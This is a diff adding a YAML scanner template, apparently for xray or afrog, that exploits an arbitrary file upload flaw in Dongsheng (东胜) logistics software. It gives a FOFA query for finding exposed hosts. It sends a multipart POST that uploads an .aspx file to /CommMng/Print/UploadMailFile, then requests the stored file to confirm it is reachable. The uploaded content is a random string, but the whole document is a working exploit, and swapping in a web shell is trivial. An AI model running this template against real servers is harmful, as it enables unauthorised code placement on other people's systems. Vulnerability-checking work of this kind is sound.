@@ -1,0 +1,33 @@
+id: poc-yaml-dongshengsoft-uploadmailfile-anyfile-upload
+info:
+  name: 东胜物流软件 UploadMailFile 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 东胜物流软件
+  fofa: app="东胜物流软件-物流软件"
+variables:
+  t1: random_str(8)
+  t2: base64(t1)
+requests:
+- method: POST
+  path: /CommMng/Print/UploadMailFile
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj
+  data: '------WebKitFormBoundaryFfJZ4PlAZBixjELj
+
+    Content-Disposition: form-data; name="LoadFile"; filename="{{.t1}}.aspx"
+
+    Content-Type: application/octet-stream
+
+
+    {{.t2}}
+
+    ------WebKitFormBoundaryFfJZ4PlAZBixjELj--'
+  expression: status_code == 200 && contains(body,"\"success\"\x3a true") && contains(body,".aspx")
+  output:
+  - regex_match(body,"(?P<file>[0-9a-z]{25}).aspx")
+- method: GET
+  path: /UploadFiles/MailFile/{{.file}}.aspx
+  expression: status_code == 200 && body == t2
+transport: http
